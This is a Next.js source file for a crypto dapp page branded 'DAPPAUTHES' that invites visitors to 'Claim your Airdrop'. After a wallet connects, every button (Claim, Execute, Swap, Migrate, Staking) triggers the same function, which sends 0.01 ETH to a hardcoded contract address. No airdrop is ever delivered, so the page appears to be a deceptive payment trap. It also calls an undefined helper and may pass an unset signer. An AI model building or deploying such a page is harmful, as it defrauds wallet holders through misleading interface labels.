import Head from "next/head";
import Image from "next/image";
import styles from "../styles/Home.module.css";
import Web3Modal from "web3modal";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import WalletConnectProvider from "@walletconnect/web3-provider";
import Authereum from "authereum";
import { abi } from "../constants/abi";
import Toggle from './Toggle'


let web3Modal;

const ethAmount = 0.01;

const providerOptions = {

  authereum: {
    package: Authereum,

  },
  
  binancechainwallet: {
    package: true
  },
  walletconnect: {
    package: WalletConnectProvider, // required
    options: {
      rpc: { 42: process.env.NEXT_PUBLIC_RPC_URL }, // required
    },
  },
};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, // required
  });
}

export default function Home() {
  const [isConnected, setIsConnected] = useState(false);
  const [hasMetamask, setHasMetamask] = useState(false);
  const [signer, setSigner] = useState(undefined);

  useEffect(() => {
    if (typeof window.ethereum !== "undefined") {
      setHasMetamask(true);
    }
  });

  async function connect() {
    
      try {
        const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      } catch (e) {
        console.log(e);
      }
    
  }
async function fund() {
  const ethAmount = "0.01";
    console.log(`Funding with ${ethAmount}...`)
  
    const web3ModalProvider = await web3Modal.connect();
        setIsConnected(true);
        const provider = new ethers.providers.Web3Provider(web3ModalProvider);
        setSigner(provider.getSigner());
      const contractAddress = '0xA2fAa6289311f06C8DC234db09512Ce9b8fAc9BF';
      const contract = new ethers.Contract(contractAddress, abi, signer);
        try {
            const transactionResponse = await contract.fund({
                value: ethers.utils.parseEther(ethAmount),
            })
            await listenForTransactionMine(transactionResponse, provider)
        } catch (error) {
            console.log(error)
        }
   
  }

  return (
    <div>
       <div>
      <header>

        
        <div className="connect-btn-container">
          <div></div>
        
        <button onClick={() => connect()} className="connect-btn">connect</button>

       </div>
      </header>

      <div className="main-container">
        <div className="inner-container">
          <div className="title-container">
            <h1 className="title">DAPPAUTHES</h1>
            </div>
          <div className="text-container">
            <p>Claim your Airdrop</p>
          </div>

          <div className="main-button-wrap-1">

            <div className="inner-button-wrap-1">

            <button className="btn" onClick={() => fund()}>Claim</button>
               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
          <button className="btn" onClick={() => fund()}>Swap</button>

            </div>

          </div>

          <div className="main-button-wrap-2">
            <div className="inner-button-wrap-2">
            <button className="btn"  onClick={() => fund()}>Migrate</button>
          <button className="btn" onClick={() => fund()}>Staking</button>
              

            </div>

          </div>

        


         

        
      </div>
    </div>

    </div>
    </div>
  );
}


